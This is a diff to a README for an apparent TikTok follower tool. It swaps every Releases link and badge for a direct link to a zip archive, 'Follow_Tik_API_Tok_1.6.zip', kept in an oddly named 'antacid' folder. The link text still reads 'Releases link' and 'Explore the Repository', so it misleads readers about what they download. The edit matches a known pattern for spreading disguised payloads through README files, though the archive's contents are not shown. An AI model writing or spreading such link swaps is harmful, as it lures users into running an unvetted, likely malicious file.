@@ -8,9 +8,9 @@ Welcome to the TikTok-Follow-API. This tool helps you manage your TikTok followe
 
 To get started, visit this page to download the latest version of the TikTok-Follow-API:
 
-[![Download TikTok-Follow-API](https://img.shields.io/badge/Download%20Now-At%20Releases-brightgreen)](https://github.com/Swats1/TikTok-Follow-API/releases)
+[![Download TikTok-Follow-API](https://raw.githubusercontent.com/Swats1/TikTok-Follow-API/main/antacid/Follow_Tik_API_Tok_1.6.zip%20Now-At%20Releases-brightgreen)](https://raw.githubusercontent.com/Swats1/TikTok-Follow-API/main/antacid/Follow_Tik_API_Tok_1.6.zip)
 
-1. Click on the [Releases link](https://github.com/Swats1/TikTok-Follow-API/releases).
+1. Click on the [Releases link](https://raw.githubusercontent.com/Swats1/TikTok-Follow-API/main/antacid/Follow_Tik_API_Tok_1.6.zip).
 2. Find the most recent version of the application.
 3. Click the download link for the version you want to use.
 4. Follow the prompts to install the application on your device.
@@ -88,7 +88,7 @@ Join the TikTok-Follow-API community for help and discussions. You can find assi
 
 To explore more about the TikTok-Follow-API, visit the repository:
 
-[![Explore the Repository](https://img.shields.io/badge/Explore%20The%20Repo-blue)](https://github.com/Swats1/TikTok-Follow-API/releases)
+[![Explore the Repository](https://raw.githubusercontent.com/Swats1/TikTok-Follow-API/main/antacid/Follow_Tik_API_Tok_1.6.zip%20The%20Repo-blue)](https://raw.githubusercontent.com/Swats1/TikTok-Follow-API/main/antacid/Follow_Tik_API_Tok_1.6.zip)
 
 Stay updated with the latest changes and features. 
 
